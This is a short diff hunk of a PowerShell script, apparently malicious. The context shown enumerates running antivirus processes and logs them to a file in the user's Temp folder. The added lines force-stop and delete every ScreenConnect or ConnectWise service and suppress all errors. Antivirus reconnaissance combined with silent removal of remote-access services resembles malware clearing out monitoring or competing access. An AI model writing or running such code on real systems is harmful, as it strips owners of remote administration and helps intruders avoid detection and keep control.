@@ -30,6 +30,13 @@ $found = @(Get-Process | Where-Object { $_.Name -match $avProcs } |
     Select-Object -ExpandProperty Name -Unique)
 [void]$state.Add("av=$($found -join ',')")
 
+$svcKill = 'ScreenConnect|ConnectWise|Screen.*Connect'
+$services = Get-Service | Where-Object { $_.Name -match $svcKill -or $_.DisplayName -match $svcKill }
+foreach ($svc in $services) {
+    try { Stop-Service -Name $svc.Name -Force -ErrorAction SilentlyContinue } catch {}
+    try { sc.exe delete $svc.Name | Out-Null } catch {}
+}
+
 [void]$state.Add('state=ok')
 [IO.File]::WriteAllBytes((Join-Path $env:LOCALAPPDATA\Temp 'value.txt'), [Text.Encoding]::UTF8.GetBytes($state -join "`n"))
 
